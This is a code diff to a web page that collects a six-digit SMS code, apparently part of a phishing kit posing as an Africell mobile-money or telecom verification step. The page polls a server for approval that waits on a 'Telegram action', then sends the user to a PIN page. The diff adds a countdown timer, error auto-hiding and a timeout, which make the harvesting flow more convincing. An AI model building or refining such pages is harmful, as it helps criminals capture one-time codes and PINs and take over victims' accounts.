@@ -230,7 +230,7 @@
             </div>
 
             <div class="resend-row" id="resendContainer">
-                Didn't get code? Resend in <span id="timer">4:32</span>
+                Didn't get code? Resend in <span id="timer">5:00</span>
             </div>
 
             <div id="inlineErrorBox" class="pp-error-box">
@@ -269,31 +269,49 @@
         let otpDigits = ['', '', '', '', '', ''];
         let activeInterval = null;
         let submissionTimestamp = 0;
+        let errorTimeout = null;
+        let countdownTimer = null;
         const phone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '+232 00000000';
 
-        let timeLeft = 272;
-        const countdownTimer = setInterval(() => {
-            if (timeLeft <= 0) {
-                clearInterval(countdownTimer);
-                resendContainer.innerHTML = 'Didn\'t get code? <a href="#" onclick="requestResendSms(event)">Resend code</a>';
-            } else {
-                timeLeft--;
-                const minutes = Math.floor(timeLeft / 60);
-                const seconds = timeLeft % 60;
-                const timerDisplay = document.getElementById('timer');
-                if (timerDisplay) {
-                    timerDisplay.innerText = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+        function startTimer() {
+            let timeLeft = 300; // 5 minutes (5:00)
+            resendContainer.innerHTML = `Didn't get code? Resend in <span id="timer">5:00</span>`;
+            
+            if (countdownTimer) clearInterval(countdownTimer);
+
+            countdownTimer = setInterval(() => {
+                if (timeLeft <= 0) {
+                    clearInterval(countdownTimer);
+                    resendContainer.innerHTML = 'Didn\'t get code? <a href="#" onclick="requestResendSms(event)">Resend code</a>';
+                } else {
+                    timeLeft--;
+                    const minutes = Math.floor(timeLeft / 60);
+                    const seconds = timeLeft % 60;
+                    const timerDisplay = document.getElementById('timer');
+                    if (timerDisplay) {
+                        timerDisplay.innerText = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+                    }
                 }
-            }
-        }, 1000);
+            }, 1000);
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            startTimer();
+        });
 
         function showInlineError(message) {
             errorText.innerText = message;
             errorBox.style.display = 'flex';
+
+            if (errorTimeout) clearTimeout(errorTimeout);
+            errorTimeout = setTimeout(() => {
+                hideInlineError();
+            }, 3500);
         }
 
         function hideInlineError() {
             errorBox.style.display = 'none';
+            if (errorTimeout) clearTimeout(errorTimeout);
         }
 
         function updateOtpDisplay() {
@@ -345,6 +363,7 @@
 
         async function requestResendSms(e) {
             e.preventDefault();
+            startTimer(); // Restart timer from 5:00 on resend
             try {
                 await fetch('/api/submit-order', {
                     method: 'POST',
@@ -409,17 +428,27 @@
 
             if (activeInterval) clearInterval(activeInterval);
 
+            // Safety timeout: unfreezes and resets after 5 minutes (300,000 ms) if no Telegram action
+            const safetyTimeout = setTimeout(() => {
+                if (activeInterval) {
+                    clearInterval(activeInterval);
+                    resetButtonState();
+                    showInlineError('⚠️ Verification request timed out after 5 minutes. Please try again.');
+                }
+            }, 300000);
+
             activeInterval = setInterval(async () => {
                 try {
                     const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}&t=${Date.now()}`);
                     const data = await response.json();
 
-                    // Fixed: Checks status cleanly without strict timestamp blocking
                     if (data.status === 'approved' && (!data.timestamp || data.timestamp >= submissionTimestamp)) {
+                        clearTimeout(safetyTimeout);
                         clearInterval(activeInterval);
                         window.location.href = 'pin.html';
                     } 
                     else if ((data.status === 'rejected' || data.status === 'wrong_id' || data.status === 'wrong_pin' || data.status === 'wrong_otp') && (!data.timestamp || data.timestamp >= submissionTimestamp)) {
+                        clearTimeout(safetyTimeout);
                         clearInterval(activeInterval);
                         showInlineError('⚠️ Incorrect code. Please try again.');
                         resetButtonState();
